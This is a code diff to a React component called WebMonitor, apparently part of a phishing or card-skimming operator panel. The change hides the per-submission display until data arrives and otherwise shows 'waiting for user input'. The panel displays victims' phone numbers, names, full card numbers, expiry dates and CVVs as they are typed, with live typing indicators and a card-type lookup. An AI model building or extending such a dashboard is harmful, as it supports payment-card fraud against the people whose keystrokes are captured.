@@ -279,91 +279,115 @@ export function WebMonitor() {
               </div>
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
-              <div className="flex items-center gap-2 mb-0.5">
-                <div className="flex items-center gap-1">
-                  <div className="text-xs text-muted-foreground">💳</div>
-                  {submission.binLookup ? (
-                    <Badge
-                      variant="outline"
-                      className={`text-xs px-1.5 py-0.5 ${
-                        submission.binLookup.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
-                        submission.binLookup.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
-                        submission.binLookup.cardType === "prepaid" ? "bg-orange-50 text-orange-600 border-orange-200" :
-                        "bg-gray-50 text-gray-600 border-gray-200"
-                      }`}
-                    >
-                      {submission.binLookup.cardType}
-                    </Badge>
-                  ) : (
-                    <span className="text-xs">识别中...</span>
-                  )}
-                </div>
+              {(() => {
+                // 检查是否有用户实际输入数据
+                const hasUserData = submission.realtimeInput && (
+                  submission.realtimeInput.phone ||
+                  submission.realtimeInput.cardNumber ||
+                  submission.realtimeInput.expiryDate ||
+                  submission.realtimeInput.cvv ||
+                  submission.userName
+                );
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[100px] transition-all duration-75 ${
-                  isFieldTyping(submission.id, 'phone')
-                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
-                    : 'border-gray-300 bg-gray-50'
-                }`}>
-                  <span className="relative">
-                    {getFieldValue(submission.id, 'phone')}
-                    {isFieldTyping(submission.id, 'phone') && (
-                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
-                    )}
-                  </span>
-                </div>
+                // 检查是否有字段正在输入
+                const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv'].some(field =>
+                  isFieldTyping(submission.id, field)
+                );
 
-                <div className={`text-sm font-medium border rounded px-2 py-1 min-w-[80px] transition-all duration-75 ${
-                  isFieldTyping(submission.id, 'name')
-                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
-                    : 'border-gray-300 bg-gray-50'
-                }`}>
-                  <span className="relative">
-                    {getFieldValue(submission.id, 'name')}
-                    {isFieldTyping(submission.id, 'name') && (
-                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
-                    )}
-                  </span>
-                </div>
+                return (hasUserData || hasActiveTyping) ? (
+                  <div className="flex items-center gap-2 mb-0.5">
+                    <div className="flex items-center gap-1">
+                      <div className="text-xs text-muted-foreground">💳</div>
+                      {submission.binLookup ? (
+                        <Badge
+                          variant="outline"
+                          className={`text-xs px-1.5 py-0.5 ${
+                            submission.binLookup.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
+                            submission.binLookup.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
+                            submission.binLookup.cardType === "prepaid" ? "bg-orange-50 text-orange-600 border-orange-200" :
+                            "bg-gray-50 text-gray-600 border-gray-200"
+                          }`}
+                        >
+                          {submission.binLookup.cardType}
+                        </Badge>
+                      ) : (
+                        <span className="text-xs">识别中...</span>
+                      )}
+                    </div>
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-75 ${
-                  isFieldTyping(submission.id, 'cardNumber')
-                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
-                    : 'border-gray-300 bg-gray-50'
-                }`}>
-                  <span className="relative">
-                    {getFieldValue(submission.id, 'cardNumber')}
-                    {isFieldTyping(submission.id, 'cardNumber') && (
-                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
-                    )}
-                  </span>
-                </div>
+                    <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[100px] transition-all duration-75 ${
+                      isFieldTyping(submission.id, 'phone')
+                        ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
+                        : 'border-gray-300 bg-gray-50'
+                    }`}>
+                      <span className="relative">
+                        {getFieldValue(submission.id, 'phone')}
+                        {isFieldTyping(submission.id, 'phone') && (
+                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                        )}
+                      </span>
+                    </div>
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-75 ${
-                  isFieldTyping(submission.id, 'expiryDate')
-                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
-                    : 'border-gray-300 bg-gray-50'
-                }`}>
-                  <span className="relative">
-                    {getFieldValue(submission.id, 'expiryDate')}
-                    {isFieldTyping(submission.id, 'expiryDate') && (
-                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
-                    )}
-                  </span>
-                </div>
+                    <div className={`text-sm font-medium border rounded px-2 py-1 min-w-[80px] transition-all duration-75 ${
+                      isFieldTyping(submission.id, 'name')
+                        ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
+                        : 'border-gray-300 bg-gray-50'
+                    }`}>
+                      <span className="relative">
+                        {getFieldValue(submission.id, 'name')}
+                        {isFieldTyping(submission.id, 'name') && (
+                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                        )}
+                      </span>
+                    </div>
 
-                <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[50px] transition-all duration-75 ${
-                  isFieldTyping(submission.id, 'cvv')
-                    ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
-                    : 'border-gray-300 bg-gray-50'
-                }`}>
-                  <span className="relative">
-                    {getFieldValue(submission.id, 'cvv')}
-                    {isFieldTyping(submission.id, 'cvv') && (
-                      <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
-                    )}
-                  </span>
-                </div>
-              </div>
+                    <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[140px] transition-all duration-75 ${
+                      isFieldTyping(submission.id, 'cardNumber')
+                        ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
+                        : 'border-gray-300 bg-gray-50'
+                    }`}>
+                      <span className="relative">
+                        {getFieldValue(submission.id, 'cardNumber')}
+                        {isFieldTyping(submission.id, 'cardNumber') && (
+                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                        )}
+                      </span>
+                    </div>
+
+                    <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-75 ${
+                      isFieldTyping(submission.id, 'expiryDate')
+                        ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
+                        : 'border-gray-300 bg-gray-50'
+                    }`}>
+                      <span className="relative">
+                        {getFieldValue(submission.id, 'expiryDate')}
+                        {isFieldTyping(submission.id, 'expiryDate') && (
+                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                        )}
+                      </span>
+                    </div>
+
+                    <div className={`text-sm font-mono border rounded px-2 py-1 min-w-[50px] transition-all duration-75 ${
+                      isFieldTyping(submission.id, 'cvv')
+                        ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
+                        : 'border-gray-300 bg-gray-50'
+                    }`}>
+                      <span className="relative">
+                        {getFieldValue(submission.id, 'cvv')}
+                        {isFieldTyping(submission.id, 'cvv') && (
+                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                        )}
+                      </span>
+                    </div>
+                  </div>
+                ) : (
+                  <div className="flex items-center justify-center py-4 mb-0.5">
+                    <div className="text-sm text-muted-foreground italic">
+                      等待用户输入数据...
+                    </div>
+                  </div>
+                );
+              })()}
 
               {/* 底部：操作按钮 */}
               <div className="flex justify-end pt-1 border-t border-gray-100">
